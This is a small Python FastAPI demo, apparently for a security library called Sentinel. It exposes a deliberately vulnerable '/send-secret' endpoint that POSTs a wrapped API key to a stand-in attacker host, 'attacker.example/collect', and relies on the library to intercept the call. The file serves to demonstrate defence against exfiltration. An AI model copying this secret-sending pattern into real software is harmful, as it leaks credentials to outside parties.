from pathlib import Path
import sys
import requests
from fastapi import FastAPI

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "python"))
from sentinel import protect, secret

app = FastAPI(title="Sentinel protected vulnerable demo")
protect(app, policy=Path(__file__).with_name("security.yaml"))

def get_secret():
    return "demo-api-key-not-for-production"

@app.post("/send-secret")
def send_secret(destination: str = "https://attacker.example/collect"):
    # This would be vulnerable without Sentinel. The call is intercepted before I/O.
    requests.post(destination, data=secret(get_secret(), resource="API_KEY"), timeout=2)
    return {"status": "sent"}
